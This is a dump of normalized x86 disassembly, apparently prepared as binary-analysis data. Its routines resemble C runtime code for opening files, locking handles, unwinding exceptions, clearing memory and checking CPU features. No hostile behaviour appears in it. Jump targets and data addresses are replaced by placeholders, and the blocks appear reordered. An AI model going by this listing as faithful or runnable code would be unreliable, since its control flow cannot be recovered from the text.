cmp [ eax ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_4059b1
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ esi + eax ]
call sub_404d8e
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
inc [ ebp - 0x1c ]
sub_40fd03
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
push ebx
xor ebx ebx
test [ ebp + 0x10 ] 0x80
push esi
push edi
mov esi eax
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x30 ] 0xc
mov [ ebp - 0x2c ] ebx
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x8000
test eax ecx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_407dd4
add esp 0x14
lea eax [ ebp - 0x20 ]
push eax
call sub_411bb6
pop ecx
test eax eax
je r-xdata
mov eax ecx
and eax 0x3
sub eax ebx
mov edx 0xc0000000
mov edi 0x80000000
je r-xdata
test ecx 0x74000
jne r-xdata
mov [ ebp - 0x8 ] edi
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ ebp - 0x20 ] eax
je r-xdata
mov [ ebp - 0x10 ] ebx
sub eax ecx
je r-xdata
test cl 0x8
je r-xdata
dec eax
je r-xdata
cmp eax 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax ecx
je r-xdata
mov [ ebp - 0x8 ] 0x40000000
jmp r-xdata
test ecx 0x70000
jne r-xdata
mov [ ebp - 0x8 ] edx
jmp r-xdata
call sub_407f77
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_407f64
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_407efc
add esp 0x14
jmp r-xdata
mov [ ebp - 0x14 ] 0x1
cmp eax 0x600
je r-xdata
mov [ ebp - 0x14 ] 0x3
jmp r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x10 ]
mov edx 0x700
and eax edx
mov ecx 0x400
cmp eax ecx
mov edi 0x100
jg r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
sub eax ecx
je r-xdata
mov eax [ ebp + 0x14 ]
push 0x10
pop ecx
sub eax ecx
je r-xdata
mov eax esi
jmp r-xdata
test al 0x40
je r-xdata
mov ecx [ rw-data ]
not ecx
and ecx [ ebp + 0x18 ]
test cl cl
js r-xdata
mov [ ebp - 0x14 ] 0x5
jmp r-xdata
cmp eax edx
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] 0x80
test edi eax
je r-xdata
cmp eax edi
je r-xdata
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
sub eax 0x40
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
test eax 0x1000
je r-xdata
or [ ebp - 0xc ] 0x4000000
or [ ebp - 0x8 ] 0x10000
or [ ebp - 0x10 ] 0x4
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
cmp [ ebp - 0x8 ] edi
sete al
mov [ ebp - 0x10 ] eax
jmp r-xdata
test al 0x20
je r-xdata
or [ ebp - 0xc ] edi
cmp eax 0x300
jne r-xdata
test al 0x10
je r-xdata
or [ ebp - 0xc ] 0x8000000
jmp r-xdata
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
call sub_410a10
mov [ esi ] eax
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0xc ] 0x10000000
mov eax [ ebp + 0x8 ]
mov edi [ CreateFileA@IAT ]
push ebx
push [ ebp - 0xc ]
mov [ eax ] 0x1
push [ ebp - 0x14 ]
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
call sub_407f77
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_407f64
mov [ eax ] 0x18
jmp r-xdata
push [ ebp - 0x1c ]
call [ GetFileType@IAT ]
cmp eax ebx
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
call sub_407f64
mov eax [ eax ]
jmp r-xdata
cmp eax 0x2
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
mov esi eax
push esi
call sub_407f8a
pop ecx
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
cmp esi ebx
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
push eax
call sub_407f8a
test [ ebp + 0x10 ] 0x1
je r-xdata
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
call sub_407f64
mov [ eax ] 0xd
jmp r-xdata
and [ ebp - 0x8 ] 0x7fffffff
push ebx
push [ ebp - 0xc ]
lea eax [ ebp - 0x30 ]
push [ ebp - 0x14 ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
push [ esi ]
call sub_4107cb
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
pop ecx
shl eax 0x6
pop ecx
mov cl [ ebp - 0x1 ]
or cl 0x1
mov [ edx + eax + 0x4 ] cl
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
shl eax 0x6
lea eax [ edx + eax + 0x24 ]
and [ eax ] 0x80
mov [ ebp - 0x3 ] cl
and [ ebp - 0x3 ] 0x48
mov [ ebp - 0x1 ] cl
jne r-xdata
or [ ebp - 0x1 ] 0x8
test [ ebp - 0x1 ] 0x80
je r-xdata
test cl 0x80
je r-xdata
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov cl [ eax ]
xor cl [ ebp - 0x2 ]
and cl 0x7f
xor [ eax ] cl
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov ecx [ ebp + 0x10 ]
mov dl [ eax ]
shr ecx 0x10
shl cl 0x7
and dl 0x7f
or cl dl
mov [ eax ] cl
cmp [ ebp - 0x3 ] bl
jne r-xdata
mov edi 0x74000
mov ecx 0x4000
test [ ebp + 0x10 ] edi
jne r-xdata
test [ ebp + 0x10 ] 0x2
je r-xdata
mov edi [ ebp - 0x8 ]
mov eax 0xc0000000
mov ecx edi
and ecx eax
cmp ecx eax
jne r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
mov eax [ ebp + 0x10 ]
and eax edi
cmp eax ecx
je r-xdata
mov eax [ ebp - 0x20 ]
and eax edi
jne r-xdata
push 0x2
or edi 0xffffffff
push edi
push [ esi ]
call sub_40bdb3
add esp 0xc
mov [ ebp - 0x18 ] eax
cmp eax edi
jne r-xdata
mov eax ebx
test [ ebp + 0x10 ] 0x1
je r-xdata
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
or [ eax ] 0x20
mov [ ebp - 0x2 ] bl
cmp eax 0x10000
je r-xdata
or [ ebp + 0x10 ] eax
or [ ebp + 0x10 ] ecx
jmp r-xdata
push 0x1
lea eax [ ebp - 0x4 ]
push eax
push [ esi ]
mov [ ebp - 0x4 ] bl
call sub_40a95e
add esp 0xc
test eax eax
jne r-xdata
call sub_407f77
cmp [ eax ] 0x83
je r-xdata
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
push ebx
push [ ebp - 0xc ]
lea eax [ ebp - 0x30 ]
push 0x3
push eax
push [ ebp - 0x10 ]
and edi 0x7fffffff
push edi
push [ ebp + 0xc ]
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
jne r-xdata
test [ ebp - 0x1 ] 0x40
mov [ ebp - 0x18 ] ebx
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x301
and ecx eax
cmp ecx eax
jne r-xdata
cmp eax 0x14000
je r-xdata
push ebx
push ebx
push [ esi ]
call sub_40bdb3
add esp 0xc
cmp eax edi
je r-xdata
cmp [ ebp - 0x4 ] 0x1a
jne r-xdata
push [ esi ]
call sub_40b9c5
jmp r-xdata
mov esi [ esi ]
mov ecx esi
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
mov [ esi + ecx ] eax
call [ GetLastError@IAT ]
push eax
call sub_407f8a
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
push [ esi ]
call sub_41084c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx 0xc0000000
and eax ecx
cmp eax 0x40000000
je r-xdata
test [ ebp + 0x10 ] 0x70000
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
mov eax [ ebp - 0x18 ]
cdq
push edx
push eax
push [ esi ]
call sub_411944
add esp 0xc
cmp eax edi
je r-xdata
pop ecx
mov eax [ ebp - 0x14 ]
cmp eax ebx
jbe r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
cmp eax 0x2
jbe r-xdata
push 0x3
lea eax [ ebp - 0x18 ]
push eax
push [ esi ]
call sub_40a95e
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax ecx
jne r-xdata
cmp eax 0x40000
je r-xdata
movsx eax [ ebp - 0x2 ]
xor edi edi
dec eax
je r-xdata
cmp eax 0x4
ja r-xdata
cmp eax 0x2
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax ebx
jbe r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
cmp eax 0x44000
jne r-xdata
mov [ ebp - 0x18 ] 0xbfbbef
mov [ ebp - 0x14 ] 0x3
dec eax
jne r-xdata
cmp eax 0x5
jne r-xdata
push 0x2
push ebx
push ebx
push [ esi ]
call sub_40f298
add esp 0x10
or eax edx
je r-xdata
mov eax [ ebp - 0x18 ]
and eax 0xffff
cmp eax 0xfffe
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jbe r-xdata
add edi eax
cmp [ ebp - 0x14 ] edi
jg r-xdata
mov [ ebp - 0x18 ] 0xfeff
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ esi ]
call sub_40f298
add esp 0x10
and eax edx
cmp eax 0xfeff
jne r-xdata
push [ esi ]
call sub_40b9c5
pop ecx
call sub_407f64
push 0x16
pop esi
mov [ eax ] esi
push ebx
push ebx
push [ esi ]
call sub_40bdb3
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x18 ] 0xbfbbef
jne r-xdata
cmp eax 0x4
jbe r-xdata
mov eax [ ebp - 0x14 ]
sub eax edi
push eax
lea eax [ ebp + edi - 0x18 ]
push eax
push [ esi ]
call sub_40e709
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
push ebx
push 0x2
push [ esi ]
call sub_40bdb3
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax 0xffffffff
jne r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
push 0x2
push ebx
push ebx
push [ esi ]
call sub_40f298
add esp 0x10
or eax edx
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ esi ]
call sub_40f298
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
sub_410422
push 0x14
push r--data
call sub_4099f4
xor esi esi
mov [ ebp - 0x1c ] esi
xor eax eax
mov edi [ ebp + 0x18 ]
cmp edi esi
setne al
cmp eax esi
jne r-xdata
or [ edi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
je r-xdata
call sub_407f64
push 0x16
pop edi
mov [ eax ] edi
push esi
push esi
push esi
push esi
push esi
call sub_407efc
add esp 0x14
mov eax edi
jmp r-xdata
cmp [ ebp + 0x1c ] esi
je r-xdata
call sub_409a39
retn
mov [ ebp - 0x4 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_40fd03
add esp 0x14
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4104c0
mov eax [ ebp - 0x20 ]
cmp eax esi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
or [ edi ] 0xffffffff
sub_4104c0
cmp [ ebp - 0x1c ] esi
je r-xdata
retn
cmp [ ebp - 0x20 ] esi
je r-xdata
push [ edi ]
call sub_4109e9
pop ecx
mov eax [ edi ]
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
sub_4104ee
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_410422
add esp 0x18
pop ebp
retn
sub_41050e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_404a6a
mov edi [ ebp - 0xc ]
cmp [ edi + 0x8 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_404cce
add esp 0xc
cmp [ ebp - 0x4 ] bl
je r-xdata
pop ebx
leave
retn
push esi
mov esi [ ebp + 0xc ]
cmp esi ebx
jne r-xdata
call sub_407f64
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_407efc
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
mov eax [ ebp + 0x8 ]
movzx ax [ eax ]
dec [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
movzx ecx ax
movzx eax cl
test [ eax + edi + 0x1d ] 0x4
je r-xdata
call sub_407f64
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_407efc
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx ax [ esi ]
movzx eax ax
movzx edx al
inc esi
test [ edx + edi + 0x1d ] 0x4
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp ax cx
jne r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov al [ eax ]
cmp al bl
jne r-xdata
movzx eax [ esi ]
xor ecx ecx
test [ eax + edi + 0x1d ] 0x4
je r-xdata
pop esi
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp cx bx
je r-xdata
mov dl [ esi ]
dec [ ebp + 0x10 ]
cmp dl bl
je r-xdata
xor eax eax
jmp r-xdata
shl ecx 0x8
movzx ax al
or cx ax
inc [ ebp + 0x8 ]
movzx ecx cx
xor ecx ecx
jmp r-xdata
movzx eax ax
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
movzx dx dl
shl eax 0x8
or ax dx
inc esi
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_410694
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4106b4
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_4061c0
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_4106f9
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_4106f9
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_4106b4
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_4107a9
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_4107c8
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_4107a9
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_4107cb
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
test eax eax
jl r-xdata
call sub_407f64
mov [ eax ] 0x9
call sub_407f77
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rw-data ]
jae r-xdata
mov ecx eax
sar ecx 0x5
mov esi eax
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
mov ecx [ edi ]
shl esi 0x6
cmp [ esi + ecx ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ edi ]
mov [ esi + eax ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub eax 0x0
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
push 0xfffffff6
dec eax
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_41084c
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
cmp ecx ebx
push esi
push edi
jl r-xdata
call sub_407f64
mov [ eax ] 0x9
call sub_407f77
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
and esi 0x1f
shl esi 0x6
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_4108d2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_407f77
and [ eax ] 0x0
call sub_407f64
mov [ eax ] 0x9
or eax 0xffffffff
pop ebp
retn
call sub_407f77
mov [ eax ] esi
call sub_407f64
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_407efc
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax [ rw-data ]
jae r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
add eax ecx
test [ eax + 0x4 ] 0x1
jne r-xdata
mov eax [ eax ]
sub_410949
push 0xc
push r--data
call sub_4099f4
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_408efb
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_409a39
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4109e0
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_40df76
pop ecx
pop ecx
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_4109e9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_410a10
push 0x18
push r--data
call sub_4099f4
or [ ebp - 0x1c ] 0xffffffff
xor edi edi
mov [ ebp - 0x24 ] edi
push 0xb
call sub_408e38
pop ecx
test eax eax
jne r-xdata
push 0xb
call sub_408efb
pop ecx
mov [ ebp - 0x4 ] edi
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_410ba1
mov eax [ ebp - 0x1c ]
mov esi [ edi * 4 + rw-data ]
test esi esi
je r-xdata
call sub_409a39
retn
push 0x40
push 0x20
call sub_40ed09
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x20 ] esi
mov eax [ edi * 4 + rw-data ]
add eax 0x800
cmp esi eax
jae r-xdata
lea ecx [ edi * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
cmp [ ebp - 0x1c ] 0xffffffff
jne r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
shl edi 0x5
mov [ ebp - 0x1c ] edi
mov eax edi
sar eax 0x5
mov ecx edi
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x4 ] 0x1
push edi
call sub_410949
pop ecx
test eax eax
jne r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
add eax 0x40
mov [ ebp - 0x20 ] eax
jmp r-xdata
inc edi
jmp r-xdata
add esi 0x40
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
or [ ebp - 0x1c ] 0xffffffff
mov edx [ ecx ]
add edx 0x800
cmp eax edx
jae r-xdata
mov [ ebp - 0x28 ] edi
cmp edi 0x40
jge r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push 0xa
call sub_408efb
pop ecx
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
lea ebx [ esi + 0xc ]
push ebx
call [ EnterCriticalSection@IAT ]
test [ esi + 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_410ae3
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_40df76
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
inc [ esi + 0x8 ]
mov [ ebp - 0x24 ] ebx
jmp r-xdata
mov [ esi + 0x4 ] 0x1
or [ esi ] 0xffffffff
sub esi [ edi * 4 + rw-data ]
sar esi 0x6
mov eax edi
shl eax 0x5
add esi eax
mov [ ebp - 0x1c ] esi
sub_410baa
push ebp
mov ebp esp
sub esp 0x4
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
shr ecx 0x7
pxor xmm0 xmm0
jmp r-xdata
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm0
movdqa [ edi + 0x20 ] xmm0
movdqa [ edi + 0x30 ] xmm0
movdqa [ edi + 0x40 ] xmm0
movdqa [ edi + 0x50 ] xmm0
movdqa [ edi + 0x60 ] xmm0
movdqa [ edi + 0x70 ] xmm0
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_410c01
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0x8 ]
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
test edi edi
jne r-xdata
neg edi
add edi 0x10
mov [ ebp - 0x10 ] edi
xor eax eax
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
[ edi ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
add ecx eax
sub edx eax
push edx
push 0x0
push ecx
call sub_410c01
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
and edx 0x7f
mov [ ebp - 0xc ] edx
cmp ecx edx
je r-xdata
test edx edx
je r-xdata
sub ecx edx
push ecx
push eax
call sub_410baa
add esp 0x8
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
add eax [ ebp + 0x10 ]
sub eax edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov edi [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
[ edi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_410ce0
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
xor eax eax
push ebx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
push ebx
pushfd
pop eax
mov ecx eax
xor eax 0x200000
push eax
popfd
pushfd
pop edx
sub edx ecx
je r-xdata
pop ebx
test [ ebp - 0x4 ] 0x4000000
je r-xdata
push ecx
popfd
xor eax eax
cpuid
mov [ ebp - 0xc ] eax
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] ecx
mov eax 0x1
cpuid
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
call sub_410c90
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebx
leave
retn
sub_410d4f
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
push 0x1004
push [ ebp + 0x8 ]
mov [ ebp - 0x6 ] 0x0
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_404fc6
pop ecx
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4061c0
leave
retn
sub_410d98
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x14 ]
